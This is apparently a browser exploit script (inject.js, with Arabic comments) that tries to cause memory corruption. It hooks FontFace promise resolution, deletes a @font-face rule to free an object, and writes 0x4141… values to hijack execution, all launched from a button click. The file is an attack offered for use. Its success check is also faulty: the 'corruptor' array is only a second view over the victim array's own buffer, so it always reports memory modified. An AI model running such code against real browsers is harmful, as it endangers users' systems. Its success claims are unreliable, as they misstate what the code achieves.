/**
 * [FULL EXPLOIT SCRIPT] - Memory Corruption & Crash Analysis
 * الملف: inject.js
 * الوظيفة: محاولة إحداث Memory Corruption للسيطرة على الـ Execution Flow
 */

ssa("[*] بدء تشغيل سكريبت الاستغلال الكامل...");

function runFullExploit() {
    try {
        // 1. إعداد الضحية (مصفوفة سنحاول التلاعب بذاكرتها)
        let victimArray = new Float64Array(8);
        for (let i = 0; i < victimArray.length; i++) victimArray[i] = 1.1;

        // 2. إعداد عنصر الـ Style للثغرة
        const style = document.createElement('style');
        style.id = 'exploit_style';
        style.innerHTML = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
        document.head.appendChild(style);

        let testFace = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
        document.fonts.add(testFace);
        void testFace.loaded;

        let triggered = false;

        // 3. قلب الهجوم (السيطرة على الذاكرة)
        Object.defineProperty(FontFace.prototype, 'then', {
            configurable: true,
            get() {
                if (!triggered && this === testFace) {
                    triggered = true;
                    ssa("[!!] [!!!] معالج التزامن: بدء التلاعب الذاكري...");
                    
                    // تحرير الكائن
                    document.getElementById('exploit_style').sheet.deleteRule(0);
                    
                    // استغلال عدواني: الكتابة في الذاكرة المجاورة
                    // نستخدم BigUint64Array للوصول إلى العناوين الذاكرية مباشرة (64-bit)
                    let corruptor = new BigUint64Array(victimArray.buffer);
                    corruptor[0] = 0x4141414141414141n; // عنوان غير صالح لإحداث Crash
                    corruptor[1] = 0x4242424242424242n;
                }
                return undefined;
            }
        });

        // 4. إطلاق عملية التحميل
        document.fonts.load('1em x', 'AB');

        // 5. التحقق من النتيجة (هل حدث فساد في الذاكرة؟)
        setTimeout(() => {
            ssa("[*] التحقق من حالة الذاكرة...");
            if (victimArray[0] !== 1.1) {
                ssa("[!!!] [SUCCESS] تم تعديل الذاكرة بنجاح! القيمة: " + victimArray[0]);
            } else {
                ssa("[-] لم يتم تعديل الذاكرة. الحماية لا تزال فعالة.");
            }
        }, 500);

    } catch (e) {
        ssa("[-] خطأ في الاستغلال: " + e.message);
    }
}

// ربط الزر بالتنفيذ
document.getElementById('exec-btn').addEventListener('click', function() {
    ssa("[*] تنفيذ الكود الاستغلالي...");
    runFullExploit();
});
